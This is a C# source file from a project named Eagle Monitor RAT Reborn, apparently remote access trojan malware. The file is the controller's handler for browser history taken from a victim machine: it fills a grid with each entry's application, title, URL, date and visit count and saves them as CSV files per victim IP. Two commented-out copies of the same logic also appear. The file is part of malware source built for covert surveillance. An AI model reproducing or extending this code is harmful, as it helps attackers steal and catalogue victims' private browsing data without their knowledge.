using Eagle_Monitor_RAT_Reborn.Network;
using Eagle_Monitor_RAT_Reborn.Misc;
using PacketLib.Packet;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class HistoryPacketHandler
    {
        public HistoryPacketHandler(HistoryPacket historyPacket) : base()//, ClientHandler clientHandler) : base() 
        {
            /*new Thread(() =>
            {
                if (historyPacket.historyList != null)
                {
                    try
                    {
                        if (clientHandler.clientForm.historyDataGridView != null)
                        {
                            clientHandler.clientForm.historyDataGridView.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.clientForm.historyDataGridView.Rows.Clear();
                                foreach (object[] str in historyPacket.historyList)
                                {
                                    int rowId = clientHandler.clientForm.historyDataGridView.Rows.Add();
                                    DataGridViewRow row = clientHandler.clientForm.historyDataGridView.Rows[rowId];
                                    row.Cells["Column5"].Value = str[0].ToString();
                                    row.Cells["Column6"].Value = str[1].ToString();
                                    row.Cells["Column7"].Value = str[2].ToString();
                                    row.Cells["Column8"].Value = str[3].ToString();
                                    row.Cells["Column9"].Value = str[4].ToString();
                                }           
                                if (Program.settings.autoSaveRecovery)
                                    Utils.ToCSV(clientHandler.clientForm.historyDataGridView, clientHandler.clientPath + "\\History\\" + Utils.DateFormater() + ".csv");
                                return;
                            }));
                        }
                        else
                        { Utils.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                    }
                    catch
                    { Utils.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                }
                else
                    return;
            }).Start();*/

            /*Task.Run(() => 
            {
                if (historyPacket.historyList != null)
                {
                    try
                    {
                        if (clientHandler.clientForm.historyDataGridView != null)
                        {
                            clientHandler.clientForm.historyDataGridView.BeginInvoke((MethodInvoker)(() =>
                            {
                                clientHandler.clientForm.historyDataGridView.Rows.Clear();
                                foreach (object[] str in historyPacket.historyList)
                                {
                                    int rowId = clientHandler.clientForm.historyDataGridView.Rows.Add();
                                    DataGridViewRow row = clientHandler.clientForm.historyDataGridView.Rows[rowId];
                                    row.Cells["Column5"].Value = str[0].ToString();
                                    row.Cells["Column6"].Value = str[1].ToString();
                                    row.Cells["Column7"].Value = str[2].ToString();
                                    row.Cells["Column8"].Value = str[3].ToString();
                                    row.Cells["Column9"].Value = str[4].ToString();
                                }
                                if (Program.settings.autoSaveRecovery)
                                    Utils.ToCSV(clientHandler.clientForm.historyDataGridView, clientHandler.clientPath + "\\History\\" + Utils.DateFormater() + ".csv");
                                return;
                            }));
                        }
                        else
                        { Utils.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                    }
                    catch
                    { Utils.ToCSV(historyPacket.historyList, clientHandler.clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                }
                else
                    return;
            });*/

            if (historyPacket.historyList != null)
            {
                try
                {
                    if (ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView != null)
                    {
                        ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.BeginInvoke((MethodInvoker)(() =>
                        {
                            ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.Rows.Clear();
                            foreach (object[] str in historyPacket.historyList)
                            {
                                int rowId = ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.Rows.Add();
                                DataGridViewRow row = ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView.Rows[rowId];
                                row.Cells["Column5"].Value = str[0].ToString();
                                row.Cells["Column6"].Value = str[1].ToString();
                                row.Cells["Column7"].Value = str[2].ToString();
                                row.Cells["Column8"].Value = str[3].ToString();
                                row.Cells["Column9"].Value = str[4].ToString();
                            }
                            if (Program.settings.autoSaveRecovery)
                                Utils.ToCSV(ClientHandler.ClientHandlersList[historyPacket.baseIp].clientForm.historyDataGridView, ClientHandler.ClientHandlersList[historyPacket.baseIp].clientPath + "\\History\\" + Utils.DateFormater() + ".csv");
                            return;
                        }));
                    }
                    else
                    { Utils.ToCSV(historyPacket.historyList, ClientHandler.ClientHandlersList[historyPacket.baseIp].clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
                }
                catch
                { Utils.ToCSV(historyPacket.historyList, ClientHandler.ClientHandlersList[historyPacket.baseIp].clientPath + "\\History\\" + Utils.DateFormater() + ".csv", new string[] { "Application", "Title", "URL", "Date", "Visit count" }); }
            }
            else
                return;
        }
    }
}
